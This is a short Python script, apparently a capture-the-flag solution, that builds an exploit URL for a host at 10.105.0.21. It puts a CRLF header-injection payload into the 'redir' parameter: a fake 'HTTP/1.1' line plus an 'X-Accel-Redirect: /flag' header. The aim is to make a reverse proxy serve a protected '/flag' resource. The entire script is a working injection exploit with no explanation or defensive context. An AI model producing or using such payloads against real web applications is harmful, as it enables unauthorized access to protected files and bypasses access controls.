from urllib.parse import urlencode

def create_url(port):
    base_url = f"http://10.105.0.21:{port}/"
    redirect_target = f"http://10.105.0.21:{port}/flag"
    injected_headers = "HTTP/1.1\r\nX-Accel-Redirect: /flag\r\n"

    # Constructing the query string with urlencode
    query_string = urlencode({'redir': redirect_target + injected_headers})

    # Constructing the final URL
    url = base_url + "?" + query_string
    return url

# Input the port number
port = input("Enter the port number: ")
url = create_url(port)
print(url)